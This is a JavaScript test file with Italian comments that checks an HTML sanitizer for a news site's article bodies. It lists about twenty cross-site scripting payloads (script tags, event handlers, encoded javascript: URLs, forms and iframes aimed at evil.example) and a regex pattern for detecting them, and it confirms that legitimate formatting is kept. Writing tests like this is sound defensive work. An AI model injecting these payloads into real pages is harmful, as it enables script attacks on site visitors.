// Mette alla prova la sanificazione del corpo degli articoli.
//
// Due domande, entrambe necessarie: riesce a bloccare i modi noti di
// infilare uno script in una pagina? E lascia intatta la formattazione che
// gli articoli usano davvero?
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const REPO = path.join(path.dirname(fileURLToPath(import.meta.url)), "..");

// safeBody non e' esportata: la si estrae dal file insieme a cio' che usa,
// cosi' il test esercita esattamente il codice che gira in produzione.
const src = fs.readFileSync(path.join(REPO, "netlify/edge-functions/prerender.js"), "utf8");
const da = src.indexOf("const ATTR_COMUNI");
const a = src.indexOf("// Data in formato ISO 8601");
const modulo = src.slice(da, a) + "\nexport { safeBody };";
const tmp = path.join(REPO, "node_modules", ".sanitize-test.mjs");
fs.writeFileSync(tmp, modulo);
const { safeBody } = await import(tmp);
fs.unlinkSync(tmp);

const results = [];
function bloccato(nome, payload) {
  const out = safeBody(payload);
  // "pericoloso" = resta nell'output qualcosa che il browser eseguirebbe
  const male = /<script|onerror|onload|onclick|onmouseover|onfocus|onstart|javascript:|<iframe|<svg|<object|<embed|<form/i.test(out);
  results.push(!male);
  console.log((male ? "> FAIL <" : "  PASS  ") + nome);
  if (male) console.log("          resta: " + out.slice(0, 160));
}
function check(nome, cond, extra) {
  results.push(cond);
  console.log((cond ? "  PASS  " : "> FAIL <") + nome);
  if (!cond && extra) console.log("          " + String(extra).slice(0, 200));
}

console.log("— tentativi di iniezione —");
bloccato("script classico", '<script>alert(1)</script>');
bloccato("script con attributi e spazi", '<script  type="text/javascript" >alert(1)</script >');
bloccato("img onerror", '<img src=x onerror=alert(1)>');
bloccato("img/onerror senza spazio (sfuggiva alla vecchia regola)", '<img/onerror=alert(1) src=x>');
bloccato("onerror andato a capo", '<img src=x\nonerror\n=\nalert(1)>');
bloccato("ONERROR maiuscolo", '<IMG SRC=x ONERROR=alert(1)>');
bloccato("href javascript:", '<a href="javascript:alert(1)">clicca</a>');
bloccato("javascript: con entita' decimali (sfuggiva alla vecchia regola)", '<a href="&#106;avascript:alert(1)">clicca</a>');
bloccato("javascript: con entita' esadecimali", '<a href="&#x6a;avascript:alert(1)">clicca</a>');
bloccato("javascript: spezzato da un tab", '<a href="java\tscript:alert(1)">clicca</a>');
bloccato("svg onload", '<svg onload=alert(1)>');
bloccato("iframe", '<iframe src="https://evil.example"></iframe>');
bloccato("body onload", '<body onload=alert(1)>');
bloccato("form che spedisce altrove", '<form action="https://evil.example"><input name=p></form>');
bloccato("style con expression", '<div style="width:expression(alert(1))">x</div>');
bloccato("style con url(javascript:)", '<div style="background:url(javascript:alert(1))">x</div>');
bloccato("commento che nasconde markup", '<!-- <img src=x onerror=alert(1)> -->');
bloccato("tag sconosciuto con gestore", '<xss onafterscriptexecute=alert(1)>x</xss>');
bloccato("attributo senza virgolette", "<img src=x onerror=alert('x')>");
bloccato("meta refresh", '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">');

console.log("\n— la formattazione legittima sopravvive —");
check("il grassetto resta", safeBody("<b>ciao</b>") === "<b>ciao</b>", safeBody("<b>ciao</b>"));
check("gli stili in linea restano (gli articoli ne usano 3677)",
  safeBody('<p style="text-align:center">x</p>') === '<p style="text-align:center">x</p>', safeBody('<p style="text-align:center">x</p>'));
check("i link normali restano", safeBody('<a href="https://esempio.it">x</a>') === '<a href="https://esempio.it">x</a>', safeBody('<a href="https://esempio.it">x</a>'));
check("i link interni restano", safeBody('<a href="/articolo/1/x">x</a>').includes('href="/articolo/1/x"'));
check("mailto resta", safeBody('<a href="mailto:redazione@iattualita.it">scrivi</a>').includes("mailto:"));
check("dir e aria restano (servono agli screen reader)",
  safeBody('<li dir="ltr" aria-level="1" role="listitem">x</li>') === '<li dir="ltr" aria-level="1" role="listitem">x</li>', safeBody('<li dir="ltr" aria-level="1" role="listitem">x</li>'));
check("un link target acquisisce rel di sicurezza",
  safeBody('<a href="https://x.it" target="_blank">x</a>').includes('rel="noopener noreferrer"'), safeBody('<a href="https://x.it" target="_blank">x</a>'));
check("le liste restano intere", safeBody("<ul><li>a</li><li>b</li></ul>") === "<ul><li>a</li><li>b</li></ul>");
check("il testo fuori dai tag non si tocca", safeBody("Costa 5$ e l'altro $& pure") === "Costa 5$ e l'altro $& pure");

// --- prova sui 131 articoli veri ---
console.log("\n— sugli articoli realmente pubblicati —");
const CORPI = path.join(REPO, "test/fixtures/corpi-articoli.json");
if (fs.existsSync(CORPI)) {
  const corpi = JSON.parse(fs.readFileSync(CORPI, "utf8"));
  let testoPerso = 0, peggiore = null;
  const testo = (h) => String(h).replace(/<[^>]*>/g, " ").replace(/\s+/g, " ").trim();
  for (const b of corpi) {
    const prima = testo(b), dopo = testo(safeBody(b));
    if (dopo.length < prima.length) {
      testoPerso++;
      if (!peggiore || prima.length - dopo.length > peggiore.d) peggiore = { d: prima.length - dopo.length, prima, dopo };
    }
  }
  check("nessuno dei " + corpi.length + " articoli perde testo", testoPerso === 0,
    peggiore && "perso: " + (peggiore.prima.length - peggiore.dopo.length) + " caratteri");

  const stiliPrima = corpi.join("").match(/style\s*=/g) || [];
  const stiliDopo = corpi.map(safeBody).join("").match(/style=/g) || [];
  check("gli stili in linea si conservano (" + stiliPrima.length + " prima, " + stiliDopo.length + " dopo)",
    stiliDopo.length >= stiliPrima.length * 0.99);
} else {
  console.log("  (saltato: test/fixtures/corpi-articoli.json assente — si rigenera con npm run fixtures)");
}

const falliti = results.filter((x) => !x).length;
console.log("\n" + results.length + " controlli, " + falliti + " falliti");
process.exit(falliti ? 1 : 0);
